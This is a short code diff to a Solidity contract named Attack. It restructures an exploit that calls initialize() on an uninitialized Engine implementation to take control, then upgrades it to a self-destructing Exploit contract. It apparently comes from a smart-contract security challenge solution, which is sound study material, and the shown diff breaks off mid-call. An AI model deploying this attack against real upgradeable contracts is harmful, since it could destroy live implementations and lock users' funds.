@@ -2,10 +2,7 @@
 
 pragma solidity <0.7.0;
 
-import "./UUPSImplementation.sol";
-import "@openzeppelin/contracts/proxy/Initializable.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
-import "./Engine.sol";
 
 contract Attack {
 
@@ -16,12 +13,14 @@ contract Attack {
     constructor(address impl) public {
         implementation = impl;
     }
-    
-    function destroy() external {
+
+    function takeControl() external returns(bytes memory) {
         // take control over the Engine
         Address.functionCall(implementation, abi.encodeWithSignature("initialize()"));
-
-        // Upgrade it to a contract that selfdestruct once initialized
+    }
+    
+    function destroy() external {
+        // Upgrade the engine to a contract that selfdestruct once initialized
         Exploit exploit = new Exploit();
 
         Address.functionCall(
